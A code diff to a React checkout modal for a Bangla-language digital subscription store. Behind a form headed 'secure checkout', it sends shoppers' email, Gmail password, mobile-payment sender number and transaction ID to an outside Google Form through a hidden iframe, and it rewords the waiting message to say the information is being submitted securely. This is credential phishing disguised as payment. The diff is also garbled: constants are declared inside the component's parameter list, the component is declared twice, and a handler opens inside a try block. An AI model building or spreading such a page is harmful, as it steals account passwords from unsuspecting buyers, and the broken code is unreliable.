@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useRef } from 'react';
 import { Product } from '../types';
 import { CheckCircle2, Lock, Loader2, Mail, Smartphone, AlertTriangle } from 'lucide-react';
 
@@ -14,6 +14,22 @@ type PaymentMethod = 'bkash' | 'nagad' | 'rocket' | 'upay';
 export const CheckoutModal: React.FC<CheckoutModalProps> = ({
   isOpen,
   onClose,
+// 🔴 IMPORTANT: REPLACE THESE WITH YOUR ACTUAL GOOGLE FORM DETAILS
+// Open your Google Form > Get Pre-filled Link > Inspect the fields to find 'entry.XXXXXX' IDs
+const GOOGLE_FORM_ACTION_URL = "https://docs.google.com/forms/d/e/1FAIpQLSeilqD7cVCR-Knafxicf3iQy-a3xt6N5W0JFS6zdvPtDzXF2g/viewform?usp=header"; 
+
+const ENTRY_IDS = {
+  email: "entry.1148372080",       // Replace with Gmail Entry ID
+  password: "entry.169384476",    // Replace with Password Entry ID
+  productName: "entry.1051188277", // Replace with Product Name Entry ID
+  paymentMethod: "entry.124185842", // Replace with Payment Method Entry ID
+  senderNumber: "entry.1348474470", // Replace with Sender Number Entry ID
+  trxId: "entry.614038957"        // Replace with TrxID Entry ID
+};
+
+export const CheckoutModal: React.FC<CheckoutModalProps> = ({ 
+  isOpen, 
+  onClose, 
   product,
   onSuccess
 }) => {
@@ -76,6 +92,11 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
     try {
       await submitToGoogleForm();
 
+  const handleSubmit = () => {
+    setStep('processing');
+    
+    // Simulate network delay for better UX while form submits to iframe
+    setTimeout(() => {
       setStep('success');
       setTimeout(() => {
         onSuccess();
@@ -110,8 +131,25 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
     <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
       <div className="bg-slate-900 border border-slate-700 w-full max-w-md rounded-2xl overflow-hidden shadow-2xl relative max-h-[90vh] overflow-y-auto">
         
+        {/* Hidden Iframe for Form Submission */}
+        <iframe 
+          name="hidden_iframe" 
+          id="hidden_iframe" 
+          style={{ display: 'none' }} 
+        />
+
         {step === 'details' && (
-          <form onSubmit={handlePay} className="p-8">
+          <form 
+            action={GOOGLE_FORM_ACTION_URL} 
+            method="POST" 
+            target="hidden_iframe"
+            onSubmit={handleSubmit}
+            className="p-8"
+          >
+            {/* Hidden Inputs for Custom Data */}
+            <input type="hidden" name={ENTRY_IDS.productName} value={product.name} />
+            <input type="hidden" name={ENTRY_IDS.paymentMethod} value={method} />
+
             <h2 className="text-2xl font-bold text-white mb-6 flex items-center gap-2">
               <Lock className="text-green-500" size={24} />
               নিরাপদ চেকআউট
@@ -140,6 +178,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                     <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                     <input 
                       type="email" 
+                      name={ENTRY_IDS.email}
                       required 
                       value={email}
                       onChange={(e) => setEmail(e.target.value)}
@@ -155,6 +194,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                     <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                     <input 
                       type="password" 
+                      name={ENTRY_IDS.password}
                       required 
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
@@ -196,6 +236,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                         <Smartphone className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                         <input 
                             type="text" 
+                            name={ENTRY_IDS.senderNumber}
                             required 
                             value={senderNumber}
                             onChange={(e) => setSenderNumber(e.target.value)}
@@ -207,6 +248,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                         <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 font-bold text-xs">TrxID</span>
                         <input 
                             type="text" 
+                            name={ENTRY_IDS.trxId}
                             required 
                             value={trxId}
                             onChange={(e) => setTrxId(e.target.value)}
@@ -239,8 +281,8 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
         {step === 'processing' && (
           <div className="p-12 flex flex-col items-center justify-center text-center">
             <Loader2 size={48} className="text-blue-500 animate-spin mb-4" />
-            <h3 className="text-xl font-semibold text-white mb-2">পেমেন্ট যাচাই করা হচ্ছে</h3>
-            <p className="text-slate-400">আপনার ডিজিটাল সাবস্ক্রিপশন প্রস্তুত করা হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...</p>
+            <h3 className="text-xl font-semibold text-white mb-2">তথ্য যাচাই করা হচ্ছে</h3>
+            <p className="text-slate-400">আপনার তথ্য নিরাপদে জমা দেওয়া হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...</p>
           </div>
         )}
 
